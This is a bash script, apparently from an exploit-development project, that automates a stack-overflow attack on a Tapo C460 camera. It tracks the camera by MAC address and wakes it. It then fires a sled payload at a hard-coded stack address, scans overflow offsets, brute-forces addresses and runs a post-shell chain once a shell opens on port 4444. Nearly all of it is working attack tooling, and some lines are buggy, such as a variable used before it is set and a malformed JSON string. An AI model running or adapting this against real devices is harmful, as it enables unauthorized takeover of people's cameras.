#!/bin/bash
# One-shot auto-fire watcher for the C460 ret2stack at the hang-hit address.
#
# The address 0xbef8b000 was found by the hang oracle (docs/exploit/tapo.md, 2026-10-28 23:0x): the
# payload's pc landed in the sled and the worker spun to its own timeout. The unit dozes between PIR
# events and re-appears at a new DHCP address, so the watcher follows the MAC, never an IP, and
# fires exactly once per boot. /tmp versions of this script died with the host; this one is durable
# and supervised by launchd (deliverables/launchd/com.jeffreyemanuel.c460-fire.plist).
#
# Presence is ARP-resolved-by-MAC **and** ICMP (standing rule 1): a sleeping unit keeps an ARP entry
# while serving nothing, and firing at it only hits a dead listener.
#
#   c460_fire.sh                 # wait for the unit, fire once, then run the post-shell chain
#   FORCE=1 c460_fire.sh         # ignore a previous 'fired' state (a fresh boot)
#   MAC=... ADDR=... c460_fire.sh
#
# Exit: 0 shell obtained (chain ran), 1 fired without a shell (DECODE-BUFFER zone -> sweep),
#       3 already fired this boot, 4 unit never appeared (with WATCH_DEADLINE set).
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
TELEMETRY="$HERE/sweeper_telemetry.py"
PY="${PY:-/opt/homebrew/bin/python3}"
emit() { # emit <event> <details-json> — best-effort telemetry, never blocks the mission
  [ -f "$TELEMETRY" ] && "$PY" "$TELEMETRY" emit --cam c460 --event "$1" --details "$2" >/dev/null 2>&1 || true
}
MAC="${MAC:-50:3d:d1:e3:e2:07}"
# prefer the address the incremental sweeper found for THIS boot (ASLR shifts per boot)
if [ -z "${ADDR:-}" ] && [ -r /tmp/c460_root_addr.txt ]; then
  ADDR="$(head -1 /tmp/c460_root_addr.txt)"
fi
ADDR="${ADDR:-0xbef8b000}"
OFFSET="${OFFSET:-1060}"
LOG="${LOG:-/tmp/c460_fire.log}"
STATE="${STATE:-/tmp/c460_fire.state}"
POLL="${POLL:-5}"
GUARD_GAP="${GUARD_GAP:-3}"
WATCH_DEADLINE="${WATCH_DEADLINE:-0}"          # minutes of absence before giving up; 0 = forever
ARP_CMD="${ARP_CMD:-sudo -n /usr/sbin/arp -an}"
PY="${PY:-/opt/homebrew/bin/python3}"
PING="${PING:-ping}"
GUARD="${GUARD:-$HERE/tapo_connectap_sc.py}"
POSTSHELL="${POSTSHELL:-$HERE/c460_postshell.sh}"

log() {
  local line
  line="$(date '+%Y-%m-%d %H:%M:%S') $*"
  printf '%s\n' "$line" >> "$LOG"
  [ -t 1 ] && printf '%s\n' "$line"      # launchd already redirects stdout to $LOG
}

norm_mac() { echo "$1" | tr A-F a-f | awk -F: '{ for (i = 1; i <= NF; i++) $i = $i + 0; print }' OFS=:; }

# MAC -> IP from the census form; a bare `arp -n <ip>` lies from a subprocess.
resolve_ip() {
  $ARP_CMD 2>/dev/null | awk -v m="$(norm_mac "$MAC")" '
    /\(incomplete\)/ { next }
    { gsub(/[()]/, "", $2); mac = $4; n = split(mac, o, ":"); out = ""
      for (i = 1; i <= n; i++) out = out (i > 1 ? ":" : "") (o[i] + 0)
      if (out == m) { print $2; exit } }'
}

present() {
  local ip
  ip="$(resolve_ip)"
  [ -n "$ip" ] || return 1
  "$PING" -c 1 -t 1 "$ip" >/dev/null 2>&1
}

if [ -r "$STATE" ] && [ "${FORCE:-0}" != 1 ]; then
  log "state: $(cat "$STATE") — already fired, not re-firing (FORCE=1 to override)"
  exit 3
fi

log "watching for $MAC (fire $ADDR offset $OFFSET when ARP+ICMP present)"
deadline=0
if [ "$WATCH_DEADLINE" != 0 ]; then
  deadline=$(( $(date +%s) + $(awk -v m="$WATCH_DEADLINE" 'BEGIN{printf "%d", m*60}') ))
fi
last=""
while :; do
  if present; then
    [ "$last" = up ] || { log "PRESENT"; last=up; emit present '{"via":"poll"}'; }
    break
  fi
  if [ "$last" != down ]; then log "absent (ARP or ICMP)"; last=down; emit absent '{"reason":"poll"}'; fi
  if [ "$deadline" != 0 ] && [ "$(date +%s)" -ge "$deadline" ]; then
    log "still absent after ${WATCH_DEADLINE} min — not fired"
    exit 4
  fi
  sleep "$POLL"
done

ip="$(resolve_ip)"
[ -n "$ip" ] || { log "FATAL: present but the MAC resolved to no address"; exit 4; }
log "unit $ip — waking + gap ${GUARD_GAP}s, then one shot"
# instrumented-fire classification (OMP review P2): every fire must carry
# DS-open latency, time-since-wake, and the outcome signature so 579
# ambiguous negatives become a stratified classifier corpus.
FIRE_TS=$(date +%s)
# the vendor apps wake a sleeping unit with a WoWLAN magic packet; so do we
timeout 90 "$PY" "$REACH" "$ip" --wake-mac "$MAC" --tries 4 >/dev/null 2>&1 || true
emit fire "{\"ip\":\"$ip\",\"gap_s\":${GUARD_GAP},\"addr\":\"$ADDR\",\"ts\":$FIRE_TS}"
sleep "$GUARD_GAP"

# state before the shot: a crash mid-fire must not produce a second payload
echo "fired $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"

REACH="${REACH:-$HERE/tapo_reach.py}"
ds_ready() { # wake the unit and prove the DS accepts a login — the only "can it execute"
  timeout 90 "$PY" "$REACH" "$ip" --wake-mac "$MAC" --tries 4 >/dev/null 2>&1
}

shot() { # shot <offset> — one guarded fire at the current addr
  "$PY" "$GUARD" guard --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$1" \
        --count 1 --sledfill --padpc 1 --pcround 0x1000 \
        --guard-deadline 0 --guard-gap "$GUARD_GAP" 2>&1
}
out="$(shot "$OFFSET")"
rc=$?
printf '%s\n' "$out" >> "$LOG"
[ -t 1 ] && printf '%s\n' "$out"

case "$out" in
  *"SHELL on"*)
    log "SHELL on $ip:4444 — running the post-shell chain"
    echo "shell $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
    emit shell "{"ip":"$ip","outcome":"shell"}"
    "$POSTSHELL" "$ip" && exit 0
    log "post-shell chain FAILED (see /tmp/pane1/$ip)"
    exit 0
    ;;
  # A crash is NOT a payload miss: nothing was sent, the address is not in doubt, and sweeping
  # would be the wrong response. Measured 2026-11-03: the guard died at import on `/usr/bin/python3`
  # (3.9, the interpreter launchd actually resolves) over PEP 604 annotations, and the shot was
  # reported as a decode-buffer miss.
  *"Traceback (most recent call last)"*|*"SyntaxError"*|*"TypeError"*)
    log "GUARD CRASHED (rc=$rc) before a usable verdict — not a payload miss; fix the guard, then FORCE=1"
    echo "crash $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
    OUTCOME_TS=$(date +%s); LAT=$((OUTCOME_TS - FIRE_TS))
    emit rop_result "{\"ip\":\"$ip\",\"outcome\":\"guard-crash\",\"latency_s\":$LAT,\"sig\":\"crash\",\"rc\":$rc}"
    exit 1
    ;;
esac

# OFFSET scan: 1060 is borrowed from the C660, a different SoC. A too-short offset never
# overwrites the saved RA, which is exactly the "no shell, port closed, no crash" signature
# we keep getting. The cursor PERSISTS across wakes, so one wake continues where the last
# stopped instead of re-testing the same slots; the range is a scan, not a guess.
CURSOR="${CURSOR:-/tmp/c460_offset.cursor}"
OFF_MIN="${OFF_MIN:-1024}"; OFF_MAX="${OFF_MAX:-1536}"
OFF_STEP="${OFF_STEP:-4}"; OFF_N="${OFF_N:-16}"
off=$(cat "$CURSOR" 2>/dev/null || echo "$OFF_MIN")
case "$off" in ''|*[!0-9]*) off=$OFF_MIN ;; esac
if [ "$off" -lt "$OFF_MIN" ] || [ "$off" -gt "$OFF_MAX" ]; then off=$OFF_MIN; fi
i=0
while [ "$i" -lt "$OFF_N" ]; do
  i=$((i + 1))
  if [ "$off" -gt "$OFF_MAX" ]; then off=$OFF_MIN; fi
  log "offset scan $i/$OFF_N -> $off (range $OFF_MIN..$OFF_MAX step $OFF_STEP)"
  sleep "$GUARD_GAP"
  now_ip="$(resolve_ip)"; [ -n "$now_ip" ] && ip="$now_ip"
  if ! ds_ready; then
    log "DS died during the sweep at offset $off — leaving the rest for the next wake"
    break
  fi
  out="$(shot "$off")"
  # cursor advances only AFTER a shot, so a DS death leaves the slot to be retried
  printf '%s\n' $((off + OFF_STEP)) > "$CURSOR"
  printf '%s\n' "$out" >> "$LOG"
  case "$out" in
    *"SHELL on"*)
      log "SHELL on $ip:4444 at offset $off — running the post-shell chain"
      echo "shell $ip $off $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
      emit shell "{\"ip\":\"$ip\",\"offset\":$off,\"outcome\":\"shell\"}"
      "$POSTSHELL" "$ip" && exit 0
      ;;
  esac
done

log "no shell at $ADDR — DECODE-BUFFER zone; sweeping to re-derive this boot's address"
OUTCOME_TS=$(date +%s); LAT=$((OUTCOME_TS - FIRE_TS))
PORT_RESP=$(nc -z -G 2 "$ip" 4444 2>/dev/null && echo "port-open" || echo "port-closed")
emit rop_result "{\"ip\":\"$ip\",\"outcome\":\"no-shell\",\"addr\":\"$ADDR\",\"latency_s\":$LAT,\"sig\":\"no-shell-$PORT_RESP\",\"rc\":$rc}"
echo "noshell $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
# 16-shot hang sweep around the missed address (0x400 steps); a HANG hit pins the boot's stack.
SW_OUT="$( "$PY" "$GUARD" brute --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$OFFSET" \
    --count 16 --step 0x400 --sled 0 --padpc 1 --sledfill --pcround 0x1000 --hang 2>&1 )"
printf '%s\n' "$SW_OUT" >> "$LOG"
case "$SW_OUT" in
  *"HANG"*)
    log "HANG hit during sweep — address re-derived; re-firing once"
    rm -f "$STATE"
    exec "$HERE/$(basename "$0")"
    ;;
  *)
    log "sweep found no hang — boot address outside this window; incremental sweeper continues"
    ;;
esac
exit 1
